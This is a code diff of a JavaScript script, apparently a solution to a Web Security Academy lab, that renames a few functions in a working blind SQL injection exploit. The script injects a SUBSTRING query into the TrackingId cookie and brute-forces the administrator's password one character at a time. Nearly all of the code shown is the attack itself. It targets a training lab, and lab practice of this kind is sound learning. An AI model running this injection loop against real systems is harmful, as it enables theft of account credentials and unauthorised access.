@@ -1,11 +1,10 @@
 import axios from "axios";
 
-// edit TrackingId and session
-const getModifiedCookie = (substrPosition, payload, trackingId, sessionId) => {
+const cookieWithInjection = (substrPosition, payload, trackingId, sessionId) => {
   return `TrackingId=${trackingId}' AND (SELECT SUBSTRING(password,${substrPosition},1) FROM users WHERE username='administrator')='${payload}; session=${sessionId}`;
 };
 
-const createUrl = (labId) => {
+const constructLabUrl = (labId) => {
   return `https://${labId}.web-security-academy.net`;
 };
 
@@ -31,18 +30,18 @@ const shortenHTML = (html) => {
 const makeReqWithDelay = async (labId, tId, sId, delay) => {
   let result = [];
   let payloads = "0123456789abcdefghijklmnopqrstuvwxyz".split("");
-  const url = createUrl(labId);
+  const url = constructLabUrl(labId);
 
   for (let substrPosition = 1; substrPosition <= 20; substrPosition++) {
     for (let j = 0; j < payloads.length; j++) {
       try {
         const response = await axios.get(url, {
           headers: {
-            Cookie: getModifiedCookie(substrPosition, payloads[j], tId, sId),
+            Cookie: cookieWithInjection(substrPosition, payloads[j], tId, sId),
           },
         });
         console.log(
-          `Testing...: ${getModifiedCookie(
+          `Testing...: ${cookieWithInjection(
             substrPosition,
             payloads[j],
             tId,
